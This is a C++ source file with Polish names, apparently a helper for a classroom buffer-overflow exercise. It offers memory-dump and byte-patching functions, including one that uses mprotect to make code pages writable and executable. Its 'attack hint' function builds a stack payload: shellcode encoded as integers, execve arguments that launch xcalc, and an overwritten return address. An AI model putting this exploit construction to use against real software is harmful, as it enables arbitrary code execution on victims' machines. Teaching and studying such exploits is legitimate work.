#include <bits/stdc++.h>
#include <sys/mman.h>

using namespace std;

void wypisz(string str) {
	cout << str << '\n';
}

void wypisz(char liczba) {
	cout << (int)(unsigned char) liczba << '\n';
}

void wypisz(short liczba) {
	cout << (unsigned short) liczba << '\n';
}

void wypisz(int liczba) {
	cout << (unsigned int) liczba << '\n';
}

void wypisz(long long liczba) {
	cout << (long long) liczba << '\n';
}

void wypisz(unsigned long liczba) {
	cout << (unsigned long long) liczba << '\n';
}

void wczytaj(long long &zmienna) {
	cin >> zmienna;
}

long long adres_na_liczbe(void* adr) {
	return (long long) adr;
}

void wypisz_pamiec_w_bajtach(void* adres, int ile_bajtow) {
	char* adr = (char*)adres;
	cout << "Zawartość " << ile_bajtow << " bajtów od " << (long long) adres << ":";
	for(int i = 0; i < ile_bajtow; i++) {
		if(i % 8 == 0) {
			cout << "\n" << (long long) adr << ":";
		}
		cout << " " << setw(4) << (int)(unsigned char)*(adr);
		adr++;
	}
	cout << '\n';
}

void wypisz_pamiec_w_long_longach(void* adres, int ile_liczb) {
	long long* adr = (long long*)adres;
	cout << "Zawartość " << ile_liczb << " bajtów od " << (long long) adres << ":";
	for(int i = 0; i < ile_liczb; i++) {
		if(i % 4 == 0) {
			cout << "\n" << (long long) adr << ":";
		}
		cout << " " << setw(20) << (unsigned long long)*(adr);
		adr++;
	}
	cout << '\n';
}

void zamien_bajt_pamieci(long long adres, int wartosc) {
	char* adr = (char*) adres;
	*(adr) = wartosc;
}

void zamien_bajt_pamieci_zmieniajac_uprawnienia(long long adres, char wartosc) {
	void* address = (void*) adres;

	const long page_size = sysconf(_SC_PAGESIZE);
	const uintptr_t addr = (uintptr_t) address;

	const uintptr_t page = addr & ~(page_size - 1);

	if (mprotect((void*)page, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) != 0)
		return;

	*(uint8_t*)address = wartosc;

	mprotect((void*)page, page_size, PROT_READ | PROT_EXEC);

	return;
}

void podpowiedz_do_ataku(void* adr) {
	long long res[30] = {0};
	char str[50] = "/usr/bin/xcalc\0xcalc\0DISPLAY=:0\0"; // pozycje 0, 15, 21
	long long *tab = (long long*) str;

	// Te komórki zawierają adres do programu `xcalc`
	res[12] = tab[0];
	res[13] = tab[1];
	res[14] = tab[2];
	res[15] = tab[3];

	// Te komórki wpisują na stos fragment kodu, który ma go uruchomić :)
	res[16] = 5188146771733301064;
	res[17] = 5198408020041940109;
	res[18] = -4394088990188991160;
	res[19] = -1404198419726077184;
	res[20] = 214442424092680;

	// argumenty syscall
	res[21] = adres_na_liczbe(adr) + 12 * 8 + 15;
	res[22] = 0;

	// evvironment do syscall
	res[23] = adres_na_liczbe(adr) + 12 * 8 + 21;
	res[24] = 0;

	// Adres powrotu ustawiamy na stworzony przez nas powyżej kod
	res[11] = adres_na_liczbe(adr) + 16 * 8;

	int n = 25;
	cout << "Podaj dane: " << '\n';
	cout << n << '\n';
	for(int i = 0; i < n; i++)
		cout << res[i] << " ";
	cout << '\n';
}
